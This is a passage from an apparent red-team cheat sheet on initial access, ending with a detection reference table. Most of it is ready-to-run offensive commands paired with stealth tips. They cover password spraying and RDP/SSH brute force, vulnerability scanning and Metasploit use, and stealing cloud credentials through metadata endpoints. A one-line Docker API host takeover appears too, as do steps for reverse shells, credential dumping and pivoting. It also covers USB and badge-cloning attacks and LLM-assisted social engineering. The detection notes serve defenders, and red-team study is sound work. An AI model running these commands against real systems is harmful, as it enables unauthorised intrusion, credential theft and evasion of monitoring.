#   Russian Market / 2easy — Direct stealer log marketplaces (operational access)
#   Telegram channels — Real-time stealer log distribution
#
# Defense: Chrome Device Bound Session Credentials (DBSC, origin trial 2025),
#   Chrome App-Bound Encryption for cookies (Windows, shipped 2024),
#   FIDO2/passkeys (session cookies still vulnerable), short session lifetimes,
#   enterprise browser with cookie protection, endpoint hardening against stealers
#
# DETECTION: Monitor stealer log marketplaces for corporate domain exposure,
#   impossible travel/device anomalies in sign-in logs, cookie replay detection
# OPSEC: Stealer logs provide access that looks completely legitimate — no exploitation
#   artifacts, no phishing pages, just a valid session from a "new device"


# ═══════════════════════════════════════════════════════════
# USER ENUMERATION (Pre-spray intelligence)
# ═══════════════════════════════════════════════════════════
# O365 user enumeration (check if email exists):
python3 o365enum.py -u emails.txt -m office
# Or via Azure AD autologon endpoint (no lockout; logging varies —
#   invalid usernames may not appear in sign-in logs, but failed sign-ins
#   for valid users may still be logged. Do not treat as fully invisible):
# POST to https://autologon.microsoftazuread-sso.com/winauth/trust/2005/usernamemixed
# Response differs for valid vs invalid users
# TeamFiltration: https://github.com/Flangvik/TeamFiltration
# Enumerate + spray + exfil — full O365 attack suite
#
# LinkedIn → employee names → derive email format:
# first.last@target.com, flast@target.com, etc.
# Tools: linkedin2username, CrossLinked
```

---

## 5 — EXPLOIT PUBLIC-FACING APPLICATION (T1190)

```bash
# ═══════════════════════════════════════════════════════════
# VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════
# Nuclei (template-based, community-maintained):
nuclei -u https://target.com -t cves/ -severity critical,high -silent
nuclei -u https://target.com -t exposures/ -t misconfigurations/
nuclei -l urls.txt -t technologies/ -t cves/ -t default-logins/ -rate-limit 50
# Nmap service + vuln detection:
nmap -sV --script=http-vuln*,http-enum,http-default-accounts -p 80,443,8080,8443 target.com
# Nikto:
nikto -h https://target.com -Tuning x 6
# searchsploit (local ExploitDB):
searchsploit <product> <version>
searchsploit -m <exploit_id>

# ═══════════════════════════════════════════════════════════
# CRITICAL CVEs — EDGE DEVICES (Primary Target for Advanced Threat Actors 2024-2026)
# ═══════════════════════════════════════════════════════════
# Edge devices (VPNs, firewalls, gateways) are the most frequently exploited
# initial access target for advanced threat actors (CISA, Mandiant, CrowdStrike 2025).
# They run as root/SYSTEM, have internet exposure, and typically lack endpoint EDR.
#
# CISA BOD 26-02 (February 5, 2026): "Mitigating Risk From End-of-Support Edge Devices"
# Co-issued with FBI and UK NCSC, explicitly referencing PRC/Volt Typhoon campaigns.
# Phased timeline (BOD issued February 5, 2026):
#   Immediate: Patch all supported edge devices with available updates
#   3 months (May 2026): Inventory all devices on CISA EOS Edge Device List, submit to CISA
#   12 months (Feb 2027): Decommission all CISA-listed EOS devices, replace with supported alternatives
#   18 months (Aug 2027): Decommission ALL remaining EOS edge devices (not just CISA-listed)
#   24 months (Feb 2028): Establish continuous discovery process for all edge devices,
#     maintain rolling inventory of devices approaching EOS
# NOTE: The BOD is CISA-issued under 44 U.S.C. § 3553(b)(2). The accompanying fact sheet
#   was co-issued with FBI and UK NCSC, explicitly referencing PRC/Volt Typhoon campaigns.
# This makes end-of-support appliances even higher-priority targets — they will never receive patches.
#
# Google GTIG tracked 90 zero-days exploited in 2025; Chinese groups most prolific exploiters.
# Edge/network devices = primary zero-day target category.
#
# FORTINET FortiOS:
# CVE-2024-21762 — FortiOS out-of-bound write → pre-auth RCE (CISA KEV)
# CVE-2024-47575 — FortiManager "FortiJump" — pre-auth RCE via fgfmd (CISA KEV)
# CVE-2023-27997 — FortiOS SSL-VPN heap overflow → pre-auth RCE
# CVE-2022-42475 — FortiOS SSL-VPN heap overflow → pre-auth RCE (used by PRC APTs)
#
# IVANTI (Pulse Secure):
# CVE-2024-21887 + CVE-2023-46805 — Connect Secure auth bypass + command injection chain
#   Used by UNC5221 (PRC) in mass exploitation campaign Jan 2024
# CVE-2025-0282 — Connect Secure stack overflow → pre-auth RCE (CISA KEV Jan 2025)
# CVE-2025-22457 — Connect Secure stack-based buffer overflow → pre-auth RCE
#   Exploited by UNC5221 deploying TRAILBLAZE/BRUSHFIRE malware; bypasses Integrity Checker Tool
# CVE-2024-8963 + CVE-2024-8190 — Cloud Services Appliance admin bypass + RCE
#
# PALO ALTO NETWORKS:
# CVE-2024-3400 — PAN-OS GlobalProtect command injection → pre-auth RCE
#   Used by UTA0218 in Operation MidnightEclipse
# CVE-2025-0108 — PAN-OS management interface auth bypass (CISA KEV Feb 2025)
#
# CISCO:
# CVE-2023-20198 + CVE-2023-20273 — IOS XE web UI auth bypass + privesc chain
#   ATTRIBUTION NOTE: Original mass exploitation Oct 2023 by unidentified actors ("BadCandy" webshell).
#   Salt Typhoon/RedMike exploited these same CVEs in a SEPARATE Dec 2024–Jan 2025 campaign
#   targeting telecom providers. Do not conflate the two campaigns.
# CVE-2024-20399 — NX-OS CLI command injection (used by Velvet Ant / PRC, reported by Sygnia)
# CVE-2025-20333 + CVE-2025-20362 + CVE-2025-20363 — ASA/FTD three critical zero-days
#   Exploited by UAT4356/Storm-1849 (China-nexus) since May 2025 ("ArcaneDoor v2")
#   Modify ROMMON (ROM Monitor) on ASA 5500-X devices lacking Secure Boot to maintain
#   persistence across reboots and software upgrades. CISA Emergency Directive ED 25-03.
#
# CITRIX:
# CVE-2023-4966 "Citrix Bleed" — NetScaler session token leak → session hijack
#
# SONICWALL:
# CVE-2024-40766 — SonicOS access control flaw (used by Akira AND Fog ransomware groups)
#
# JUNIPER NETWORKS:
# CVE-2025-21590 — Junos OS MX routers: Chinese espionage actors deployed TinyShell backdoors
#   on end-of-life routers (Mar 2025). Named by Google GTIG as key PRC zero-day example.
#
# WATCHGUARD:
# CVE-2025-14733 (CVSS 9.3) — Fireware OS IKEv2 VPN zero-day exploited Dec 2025.
#   ~125,000 affected devices. Added to CISA KEV.
#
# ZYXEL:
# CVE-2025-13942 (CVSS 9.8) — Command injection across 18+ router models.
#
# HPE:
# CVE-2025-37164 — HPE OneView CVSS 10.0 unauthenticated RCE affecting versions 5.20-10.20
#   (all versions prior to v11.00). PoC available (Rapid7). Added to CISA KEV Jan 7, 2026.
#
# DETECTION: Exploit artifacts in appliance logs, unexpected admin sessions
#   CISA KEV catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
# OPSEC: Exploit directly from VPS → gain shell on edge device → pivot internally
#   Edge devices typically have NO EDR — ideal initial foothold

# ═══════════════════════════════════════════════════════════
# CRITICAL CVEs — WEB APPLICATIONS
# ═══════════════════════════════════════════════════════════
# CONFLUENCE:
# CVE-2023-22515 — Broken access control → create admin account (pre-auth)
# CVE-2023-22518 — Improper authorization → RCE
# CVE-2022-26134 — OGNL injection → pre-auth RCE
#
# EXCHANGE:
# ProxyShell (CVE-2021-34473+34523+31207) — SSRF + privesc + RCE chain
# ProxyNotShell (CVE-2022-41040+41082) — SSRF + RCE (requires auth)
# CVE-2024-21410 — NTLM relay via Exchange (CVSS 9.8, actively exploited)
#   ATTRIBUTION: NO authoritative source (Microsoft, CISA, Mandiant) has formally attributed
#   this to Forest Blizzard/APT28. Confusion likely stems from APT28's exploitation of the
#   SIMILAR CVE-2023-23397 (Outlook NTLM relay). Treat attribution as UNCONFIRMED.
# NOTE: On-prem Exchange remains a top target — many orgs still run it
#
# MOVEIT:
# CVE-2023-34362 — SQLi → RCE (used by CL0P for mass data theft)
#
# SHAREPOINT:
# CVE-2023-29357 — Auth bypass → RCE chain with CVE-2023-24955
#
# JENKINS:
# CVE-2024-23897 — Arbitrary file read via CLI args parsing
#
# VEEAM:
# CVE-2024-40711 — Backup & Replication RCE (targeted by Akira, Fog, and other ransomware groups)
#
# VMWARE vCENTER:
# CVE-2021-22005 — File upload → RCE
# CVE-2023-34048 — vCenter out-of-bounds write → RCE (used by UNC3886 / PRC)

# ═══════════════════════════════════════════════════════════
# EXPLOIT FRAMEWORKS & METHODOLOGY
# ═══════════════════════════════════════════════════════════
# Metasploit:
msfconsole
search type:exploit <product>
use exploit/path/to/module
set RHOSTS target.com && set LHOST <IP> && exploit
# Manual PoC:
searchsploit <product> <version>
# GitHub: search "CVE-YYYY-NNNNN PoC" → review code → modify callback → test
# ALWAYS: read PoC code before running — verify it does what it claims
#
# POST-EXPLOIT ON EDGE DEVICE:
# 1. Establish reverse shell or implant on the appliance
# 2. Dump credentials stored on device (VPN users, LDAP bind creds, certificates)
# 3. Identify internal network ranges (routing table, ARP cache, interface config)
# 4. Pivot to internal network through the compromised appliance
# 5. Deploy persistence on the appliance (see Persistence cheat sheet)
#
# DETECTION: Appliance integrity checks, unexpected processes, modified firmware
#   Vendor-specific forensic tools (Fortinet DART, Ivanti ICT, etc.)
# OPSEC: Edge device exploitation is quiet — no endpoint EDR to evade
```

---

## 6 — EXTERNAL REMOTE SERVICES (T1133)

```bash
# ═══════════════════════════════════════════════════════════
# VPN ACCESS WITH STOLEN/SPRAYED CREDENTIALS
# ═══════════════════════════════════════════════════════════
# After successful spray (Section 4) or credential theft (Section 2):
# Connect to target VPN with valid credentials
# If MFA: use stolen session token, or bypass via:
#   - Enrolled MFA device from compromised account
#   - MFA fatigue/push bombing (send repeated MFA pushes until user accepts)
#   - Social engineering: call user pretending to be IT, ask them to accept push
# Post-connect: internal network access → begin lateral movement
#
# DETECTION: VPN login from unusual location/device, after-hours access
# OPSEC: Connect from residential IP (not VPS/cloud), match user's timezone

# ═══════════════════════════════════════════════════════════
# RDP (T1021.001)
# ═══════════════════════════════════════════════════════════
# Exposed RDP remains a top initial access vector
# (Sophos Active Adversary Report Apr 2024: RDP abused in 90% of 2023 IR cases,
#  BUT this is across ALL attack phases — primarily internal lateral movement.
#  External remote services including RDP were the INITIAL ACCESS vector in 65% of cases.
#  Do not conflate RDP-as-lateral-movement with RDP-as-initial-access.)
# Spray:
nxc rdp target.com -u users.txt -p "Spring2026!" --continue-on-success
hydra -L users.txt -P passwords.txt rdp://target.com
# Brute (if no lockout):
crowbar -b rdp -s target.com/32 -U users.txt -C passwords.txt
#
# DETECTION: Event ID 4624 type 10, TerminalServices-LocalSessionManager 21/25
# OPSEC: LOW stealth — RDP is heavily monitored. Prefer VPN access if available.

# ═══════════════════════════════════════════════════════════
# SSH (T1021.004)
# ═══════════════════════════════════════════════════════════
hydra -L users.txt -P passwords.txt ssh://target.com
# Key-based: check breach data for leaked SSH keys
# Exposed SSH with weak/default keys on IoT/network devices
#
# DETECTION: /var/log/auth.log, failed auth rate
# OPSEC: MEDIUM — SSH is normal but brute force is obvious

# ═══════════════════════════════════════════════════════════
# EXPOSED MANAGEMENT INTERFACES
# ═══════════════════════════════════════════════════════════
# Discovery via Shodan/Censys:
shodan search "org:Target Corp" "port:3389 OR port:22 OR port:443"
# Look for: Jenkins, Grafana, Kibana, phpMyAdmin, Tomcat Manager,
#   Kubernetes API (6443), Docker API (2375/2376), etcd (2379),
#   Elasticsearch (9200), Redis (6379), MongoDB (27017)
# Default credentials: /usr/share/seclists/Passwords/Default-Credentials/
# Nuclei default-login templates:
nuclei -u https://target.com:8443 -t default-logins/ -silent
```

---

## 7 — CLOUD INITIAL ACCESS

```bash
# ═══════════════════════════════════════════════════════════
# AWS INITIAL ACCESS
# ═══════════════════════════════════════════════════════════
# Misconfigured S3 buckets:
aws s3 ls s3://target-bucket --no-sign-request    # Public bucket
aws s3 cp s3://target-bucket/backup.sql . --no-sign-request
# Exposed credentials:
# Search GitHub/GitLab for: "target.com" AWS_ACCESS_KEY AKIA
# Check: .env files, docker-compose.yml, Terraform state files
# SSRF → metadata endpoint (IMDSv1 — LEGACY, increasingly blocked):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns IAM role credentials if instance has a role attached
#
# CRITICAL: IMDSv2 is now DEFAULT on new EC2 instances (AWS enforcement since 2024).
#   IMDSv2 requires a session token obtained via PUT request first:
#   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
#   curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   IMDSv1 (simple GET) only works if still enabled. Check: aws ec2 describe-instances → HttpTokens
#   If HttpTokens = "required" → IMDSv2 only → simple SSRF to v1 endpoint WILL FAIL.
#
# Cognito identity pool misconfiguration:
# If unauthenticated access enabled → get temporary AWS credentials
aws cognito-identity get-id --identity-pool-id <POOL_ID> --region us-east-1
aws cognito-identity get-credentials-for-identity --identity-id <ID> --region us-east-1

# ═══════════════════════════════════════════════════════════
# AZURE / ENTRA ID INITIAL ACCESS
# ═══════════════════════════════════════════════════════════
# Device code phishing and OAuth consent phishing (see Section 2)
# Password spray against Azure AD (see Section 4)
#
# Exposed Azure Blob Storage:
# Check: https://<account>.blob.core.windows.net/<container>?restype=container&comp=list
# Public blobs may contain backups, configs, credentials
#
# Azure AD tenant enumeration:
# Check if domain uses Azure AD:
curl -s "https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration"
# AADInternals (PowerShell, v0.9.8 — parameter name varies by version):
# NOTE: Since v0.9.6, AADInternals is split into TWO modules:
#   - AADInternals (core identity/tenant functions)
#   - AADInternals-Endpoints (device-specific functions)
#   Both must be installed. Documentation reflects Entra ID naming.
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com
# NOTE: Some versions use -Domain instead of -DomainName. Check: Get-Help Invoke-AADIntReconAsOutsider
# Returns: tenant ID, domains, login URL, MFA status hints

# ═══════════════════════════════════════════════════════════
# GCP INITIAL ACCESS
# ═══════════════════════════════════════════════════════════
# Exposed GCS buckets:
gsutil ls gs://target-bucket                  # If public
# Service account key leaks:
# Search GitHub for: "target" "private_key_id" type:"service_account"
# SSRF → GCP metadata:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# ═══════════════════════════════════════════════════════════
# KUBERNETES / CONTAINER INITIAL ACCESS
# ═══════════════════════════════════════════════════════════
# Exposed Kubernetes API:
curl -sk https://target:6443/api/v1/pods
# Unauthenticated kubelet API:
curl -sk https://target:10250/pods
# Exposed Docker API:
curl http://target:2375/containers/json
# If Docker API is exposed → instant RCE:
docker -H tcp://target:2375 run -v /:/mnt --rm -it alpine chroot /mnt bash
#
# DETECTION: API server audit logs, unusual pod creation
# OPSEC: Container/K8s access often lacks monitoring — high stealth
```

---

## 8 — SUPPLY CHAIN, CI/CD, & SaaS-to-SaaS ATTACKS

```bash
# ═══════════════════════════════════════════════════════════
# SOFTWARE SUPPLY CHAIN (T1195.002)
# ═══════════════════════════════════════════════════════════
# Compromise a software vendor or dependency → inject into their update/release:
# Real-world examples:
#   SolarWinds (APT29/Cozy Bear, 2020) — trojanized Orion update
#   3CX (Lazarus Group, 2023) — trojanized desktop client
#   Codecov (2021) — compromised CI/CD bash uploader
#   PyPI/npm typosquatting — register packages with similar names
#     (e.g., "requets" instead of "requests")
#
# CI/CD pipeline compromise:
# If you gain access to target's CI/CD (Jenkins, GitHub Actions, GitLab CI):
# Modify build pipeline → inject backdoor into software artifacts
# Backdoor gets deployed to production through normal release process
#
# DETECTION: Software hash verification, SBOM analysis, build provenance checks
# OPSEC: Extremely high stealth — code runs as part of legitimate software

# ═══════════════════════════════════════════════════════════
# CI/CD PIPELINE COMPROMISE (T1195.002 + T1199)
# ═══════════════════════════════════════════════════════════
# Emerged as proven initial access path in 2025. Supply chain via build infrastructure.
#
# 2025 REAL-WORLD EXAMPLES:
#   tj-actions/changed-files (CVE-2025-30066, Mar 2025):
#     Compromised GitHub Action used by 23,000+ repositories.
#     Malicious code dumped CI/CD secrets (API keys, tokens, creds) to workflow logs.
#   GhostAction campaign (Sep 2025):
#     3,325 secrets stolen across 817 repositories using compromised workflows.
#   UNC6426 — GitHub-to-AWS full pivot:
#     Compromised npm package CI workflow → exploited OIDC trust between GitHub Actions
#     and AWS → created AdminAccess IAM roles → exfiltrated S3 data, destroyed EC2/RDS.
#
# Attack vectors:
# 1. Compromise popular GitHub Action / reusable workflow → inject secret exfiltration
# 2. Compromise npm/PyPI package → modify CI/CD post-install script
# 3. Exploit OIDC federation trust: GitHub Actions → AWS/Azure/GCP
#    Many orgs grant overly permissive OIDC trust (e.g., repo:* → AdministratorAccess)
# 4. Steal CI/CD runner tokens → authenticate as the pipeline identity
# 5. Inject into GitLab CI/Jenkins pipeline config via compromised developer account
#
# DETECTION: Workflow audit logs, secret scanning, OIDC trust scope review,
#   build provenance (SLSA/Sigstore), dependency pinning verification
# OPSEC: VERY HIGH — execution happens in trusted CI context, often cloud-native

# ═══════════════════════════════════════════════════════════
# SaaS-to-SaaS TOKEN THEFT (T1528 + T1199)
# ═══════════════════════════════════════════════════════════
# Compromise a SaaS vendor → use pre-approved OAuth tokens to pivot to customers.
# SaaS integrations create hidden trust chains: one breach cascades to hundreds of orgs.
#
# 2025 REAL-WORLD EXAMPLES:
#   Salesloft/Drift breach (UNC6395):
#     Compromised Salesloft internal systems → stole OAuth tokens from Drift integrations
#     → used pre-approved tokens to access Salesforce instances of 700+ organizations
#     including Cloudflare, Palo Alto Networks, and CyberArk.
#   UNC6040 (ShinyHunters-linked):
#     Used vishing to access Salesforce at ~40 major organizations.
#     FBI issued FLASH alert. Prompted Salesforce emergency patches.
#   Slack credential theft:
#     270,000+ credentials compromised by infostealers in H1 2025.
#     Slack tokens provide persistent access to all channels, files, DMs.
#
# Attack methodology:
# 1. Identify SaaS vendors with OAuth integrations to target (Salesloft, HubSpot, etc.)
# 2. Compromise vendor's internal environment via any initial access method
# 3. Harvest stored OAuth tokens/refresh tokens from vendor's backend
# 4. Use pre-approved tokens to access customer data — no additional auth required
# 5. Alternatively: compromise individual user's SaaS session tokens via infostealer
#
# DETECTION: SaaS audit logs (Salesforce Event Monitoring, Slack audit),
#   OAuth token usage anomalies, impossible travel in SaaS, AppOmni/Obsidian/Adaptive Shield
# OPSEC: VERY HIGH — access via legitimate pre-approved OAuth integration paths

# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# DPRK CONTAGIOUS INTERVIEW CAMPAIGN [NEW] (T1566.002 + T1195.002 + T1204.002)
# ═══════════════════════════════════════════════════════════
# DISTINCT from DPRK IT worker infiltration (below). Contagious Interview targets
# DEVELOPERS at other companies via fake job interviews; IT worker fraud places
# DPRK operatives AS employees. Both are active, both are high-impact.
#
# Scale: 1,700+ malicious packages across npm, PyPI, Go, Rust, PHP as of Apr 2026.
#   338+ packages in a single wave (Oct 2025), 50,000+ cumulative downloads.
#   180+ fake personas across npm aliases. Active since at least 2022.
#   Socket tracks weekly upload bursts with rapid re-uploads after takedowns.
#
# Tracked as: Contagious Interview, CL-STA-0240, DeceptiveDevelopment, DEV#POPPER,
#   Famous Chollima, Gwisin Gang, Tenacious Pungsan, UNC5342, Void Dokkaebi (MITRE G1052)
#
# Methodology:
#   1. DPRK operators create fake recruiter personas on LinkedIn
#   2. Target blockchain/crypto/Web3/AI developers with job offers
#   3. Send "take-home coding assessment" via GitHub/GitLab/Bitbucket repo
#   4. Repo contains malicious npm/PyPI packages (typosquatting real packages):
#      e.g., "epxresso" (Express), "dotevn" (dotenv), "boby_parser" (body-parser)
#   5. "npm install" or "pip install" executes post-install script
#   6. Script delivers BeaverTail (info-stealer) → InvisibleFerret (backdoor/persistence)
#   7. Or: newer OtterCookie malware (Oct 2025+) with heavy obfuscation
#
# ClickFake Interview variant (2025):
#   Combines Contagious Interview lures with ClickFix delivery technique
#   Fake Zoom/Meet pages → ClickFix CAPTCHA → GolangGhost/PylangGhost payloads
#
# Visual Studio Code abuse (2026, per Microsoft):
#   Victims open malicious repo in VS Code → prompted to "trust" repository
#   VS Code auto-executes task configuration → fetches and runs backdoor
#
# Payloads:
#   BeaverTail — JavaScript stealer: browser passwords, cookies, crypto wallets
#   InvisibleFerret — Python backdoor: keylogging, screenshot, clipboard monitoring,
#     persistent C2 via HTTP, exfiltration to DPRK infrastructure
#   OtterCookie — Newer variant combining BeaverTail functionality with heavier
#     obfuscation (encoded string pools, shuffled arrays)
#
# Financial impact: North Korea-linked actors stole ~$2B in cryptocurrency in 2025,
#   $1.5B in the largest single crypto heist (Bybit, Feb 2025)
#
# DETECTION: npm audit, Socket/Snyk dependency scanning, unusual post-install scripts,
#   unexpected outbound connections from dev environments, Node.js processes spawning
#   PowerShell/CMD, clipboard monitoring behavior, screenshot-desktop npm package usage
# OPSEC RATING: HIGH — execution happens in developer's trusted environment
#   Weakness: security-conscious devs may inspect package.json/postinstall scripts
#   Defense: containerized dev environments, npm/pip audit, network segmentation for dev

# DPRK IT WORKER INFILTRATION (T1078 + T1199)
# ═══════════════════════════════════════════════════════════
# Novel initial access vector: North Korean operatives hired as remote employees.
# Famous Chollima / PurpleBravo operates the largest known insider threat program.
#
# Scale: 320+ companies infiltrated in 12 months (220% increase year-over-year).
#   Nearly every Fortune 500 company affected. DOJ raided 29 laptop farms across 16 states.
#
# Methodology:
# 1. Use stolen US identities (SSN, driver's license) to create profiles
# 2. Apply for remote IT/engineering positions at target companies
# 3. Use real-time deepfake technology in video interviews (AI face swap + voice clone)
# 4. US-based facilitators operate "laptop farms" — receive company laptop at US address,
#    install RMM tools (AnyDesk, RustDesk), forward access to DPRK operators
# 5. Once hired: install additional RMM tools, exfiltrate source code and internal data,
#    pivot to higher-privileged systems, facilitate follow-on ransomware/espionage
# 6. If terminated: extort employer with stolen data
#
# Indicators: multiple remote jobs simultaneously, camera avoidance, VPN from
#   unexpected geos, high RMM tool usage, reluctance to appear on video
#
# Red team simulation: not typically reproduced, but understanding the technique helps
#   model insider threat scenarios and test detection of unauthorized RMM tools
#
# DETECTION: Background check deepening, live video verification with pose challenges,
#   RMM tool monitoring (unauthorized AnyDesk/RustDesk), laptop shipping address analysis
# OPSEC RATING: VERY HIGH — legitimate employee access, passes standard background checks

# ═══════════════════════════════════════════════════════════
# TRUSTED RELATIONSHIP (T1199)
# ═══════════════════════════════════════════════════════════
# Compromise MSP/IT provider → pivot to all their clients
# Abuse partner VPN/site-to-site connections
# Exploit federated identity (SAML/OIDC trust between organizations)
# Target vendor with privileged access to target environment
# Examples:
#   Kaseya (REvil, 2021) — MSP management tool → 1500+ orgs
#   Microsoft cloud partner compromise (Nobelium/APT29, 2023)
#
# DETECTION: Unusual access from partner IP ranges, federated auth anomalies
# OPSEC: Very high stealth — access comes from trusted source

# ═══════════════════════════════════════════════════════════
# WATERING HOLE (T1189)
# ═══════════════════════════════════════════════════════════
# Identify websites frequented by target employees (industry sites, forums, news)
# Compromise those websites → inject exploit code / malicious redirect
# Selective targeting: only serve exploit to visitors from target IP ranges
# Browser exploitation: typically requires 0-day (very high cost)
# Alternative: inject credential harvesting instead of exploit
#
# DETECTION: Website integrity monitoring, browser exploit detection
# OPSEC: HIGH stealth if selective targeting is used (only target IP ranges served exploit)
```

---

## 9 — PHYSICAL ACCESS & HARDWARE IMPLANTS

```bash
# ═══════════════════════════════════════════════════════════
# NETWORK IMPLANT DEPLOYMENT (T1200)
# ═══════════════════════════════════════════════════════════
# Raspberry Pi / similar SBC:
# Pre-configure with: reverse SSH tunnel, C2 agent, WiFi AP
# Connect to open network port (conference room, printer port, under desk)
# Device auto-connects back to attacker C2 via HTTPS or DNS
# Hak5 devices:
# LAN Turtle: Inline USB Ethernet implant (stealth, passive)
# Packet Squirrel: Inline network tap (capture + exfil)
# Shark Jack: Quick network recon (plug in, scan, pull out)
# WiFi Pineapple: Rogue AP for wireless attacks
#
# DETECTION: Network device inventory (NAC), unexpected DHCP leases, rogue device scan
# OPSEC: Label device as legitimate IT equipment, match cabling to environment

# ═══════════════════════════════════════════════════════════
# USB ATTACKS (T1091 + T1200)
# ═══════════════════════════════════════════════════════════
# Rubber Ducky: Keystroke injection device (appears as HID keyboard)
# Payload: opens PowerShell, downloads + executes beacon in <5 seconds
# O.MG Cable: USB cable with embedded implant — indistinguishable from normal cable
# Bash Bunny: Multi-vector USB attack platform (HID + storage + network)
# USB drop: Leave Rubber Ducky / weaponized USB in parking lot, lobby, mailroom
#   Label: "Salary Review Q4" or "Confidential - HR"
#
# DETECTION: USB device connection events (Security Event ID 6416 — Audit PnP Activity),
#   device control policies, EDR: HID device enumeration, rapid keystroke injection detection
# OPSEC: USB attacks require physical proximity — high risk of physical detection

# ═══════════════════════════════════════════════════════════
# BADGE CLONING & PHYSICAL ENTRY
# ═══════════════════════════════════════════════════════════
# Proxmark3: Read HID/iClass/MIFARE badges → clone to T5577 or magic card
# Long-range HID reader: capture badge data at 2-3 feet distance
# Flipper Zero: multi-protocol reader (RFID, NFC, sub-GHz, IR)
# Tailgating: follow employee through secured door
# Social engineering: "forgot badge", delivery pretext, maintenance worker
# Lock bypass: shims, bump keys, electric picks, under-door tools
#
# DETECTION: Badge access logs, security cameras, visitor logs
# OPSEC: Dress code matters — match the environment (business casual, uniform, etc.)
```

---

## 10 — MOBILE INITIAL ACCESS & ZERO-CLICK EXPLOITS

```bash
# ═══════════════════════════════════════════════════════════
# MOBILE ZERO-CLICK EXPLOITS (T1189 + T1190)
# ═══════════════════════════════════════════════════════════
# Nation-state primary vector for targeting individuals (diplomats, journalists, activists).
# Google GTIG: 90 zero-days exploited in 2025; mobile = primary individual target category.
# Commercial spyware vendors (NSO Group/Pegasus, Intellexa/Predator, QuaDream, Candiru)
# sell turnkey zero-click exploit chains for iOS and Android.
#
# Zero-click = no user interaction required. Typical delivery:
#   - iMessage: exploit in media parsing (image, video, PDF)
#   - WhatsApp: exploit in call setup or media rendering
#   - SMS/RCS: exploit in message processing
#   - Push notification: exploit in notification rendering
# Exploit chain: initial code exec → sandbox escape → kernel exploit → persistence
#
# Red team relevance:
# - Zero-click development requires VERY HIGH skill and budget ($2M+ per chain)
# - Commercial spyware licensing: $5M-$25M annually (state-level budgets only)
# - For most red teams: mobile phishing (AiTM on mobile browser) is realistic alternative
# - QR code phishing shifts victim to mobile device outside EDR boundary
# - Mobile MDM enrollment abuse: if you compromise MDM admin, push malicious profiles
#
# DETECTION: Mobile threat defense (MTD) solutions, anomalous process execution,
#   unusual network connections from mobile, Lockdown Mode (Apple), Google Play Protect
# OPSEC: VERY HIGH — zero-click leaves minimal forensic artifacts
#   Apple Lockdown Mode (iOS 16+) blocks most zero-click attack surfaces

# ═══════════════════════════════════════════════════════════
# AI/LLM-ENHANCED SOCIAL ENGINEERING
# ═══════════════════════════════════════════════════════════
# 2025 saw industrialization of AI in social engineering:
# - LLM-generated spearphishing: perfect grammar, context-aware, personalized at scale
# - Real-time deepfake video: used in DPRK IT worker interviews and executive impersonation
# - Voice cloning: 3-second audio sample → convincing voice clone for vishing
# - AI-generated profile photos: bypass reverse image search detection
# - Automated OSINT synthesis: LLMs process LinkedIn, social media, breach data
#   to generate highly targeted pretexts without manual analysis
# - Translation: native-quality phishing in any language without native speakers
#
# Vishing surged 442% in late 2024 (CrowdStrike). AI reduces barrier to entry
# for non-native-English threat actors (PRC, DPRK) to conduct convincing social engineering.
#
# DETECTION: AI content detection (limited effectiveness), behavioral analysis,
#   out-of-band verification for high-risk requests (wire transfers, credential resets)
# OPSEC: HIGH — AI-generated content lacks the stylistic tells of non-native speakers
```

---

## 11 — OPSEC & DETECTION REFERENCE

```
INITIAL ACCESS DETECTION SIGNATURES:
──────────────────────────────────────────────────────────────
TECHNIQUE              │ KEY DETECTIONS                     │ LOGS/TELEMETRY
───────────────────────┼────────────────────────────────────┼─────────────────────
ClickFix/fake CAPTCHA  │ mshta/PS from explorer.exe, RunMRU │ Sysmon 1, PS logging
AiTM phishing          │ New device sign-in, atypical travel│ Entra ID sign-in, CA
Device code phishing   │ Device code auth method logged     │ Entra ID sign-in logs
OAuth consent phish    │ Consent grant event, new app       │ Entra ID audit, UAL
Infostealer access     │ Session replay, impossible travel  │ Entra ID, CASB, UEBA
Password spray         │ Bulk 4771/failed logins, lockouts  │ DC security log, Entra
Credential stuffing    │ Distributed failed logins          │ WAF, proxy, auth logs
Edge device exploit    │ Appliance crash/restart, new admin │ Appliance syslog, SIEM
Web app exploit        │ WAF alerts, error spikes, webshell │ WAF, access logs, FIM
RDP brute force        │ Event 4625 (type 10) in bulk       │ Security log, NLA logs
VPN with stolen creds  │ Unusual VPN location/device        │ VPN auth logs, RADIUS
Spearphish payload     │ Email gateway alerts, sandbox det. │ Email gateway, EDR
HTML smuggling         │ JS assembly patterns in email      │ Email gateway (advanced)
Vishing / voice phish  │ Helpdesk MFA reset anomalies       │ ITSM tickets, call logs
USB/physical implant   │ New HID device, DHCP lease         │ Security 6416, NAC, DHCP
Supply chain           │ Hash mismatch in signed software   │ SBOM, build provenance
CI/CD pipeline         │ Workflow changes, secret exposure   │ GitHub audit, CloudTrail
SaaS-to-SaaS token     │ OAuth token anomalies, new app     │ SaaS audit logs, CASB
Contagious Interview   │ Malicious npm postinstall, C2 conn │ EDR, npm audit, netflow
DPRK IT worker         │ Multi-job indicators, RMM tools    │ EDR, HR systems, MDM
Watering hole          │ Browser exploit detection, IDS     │ Proxy, IDS/IPS, EDR
Mobile zero-click      │ Anomalous process, unusual network │ MTD, device health logs

ENTRA ID / O365 CRITICAL EVENTS:
  UserLoggedIn                  All sign-ins (check auth method)
  Device code sign-in           Visible in Entra ID sign-in logs (auth method = "Device code")
  Consent to application        OAuth app consent grant
  Add service principal         New app registered
  New-InboxRule                 Email forwarding rule
  MailItemsAccessed             Mailbox content read (E5/explicit)

WINDOWS ENDPOINT:
  4624    Logon (type 2=interactive, 3=network, 10=RDP)
  4625    Failed logon (brute force detection)
  4648    Explicit credential logon
  4771    Kerberos pre-auth failed (spray detection)
  6416    New external device recognized (Windows Security — Audit PnP Activity)

NETWORK:
  Proxy logs: unusual domains, newly registered domains, certificate anomalies
  DNS: queries to newly registered domains, DGA patterns
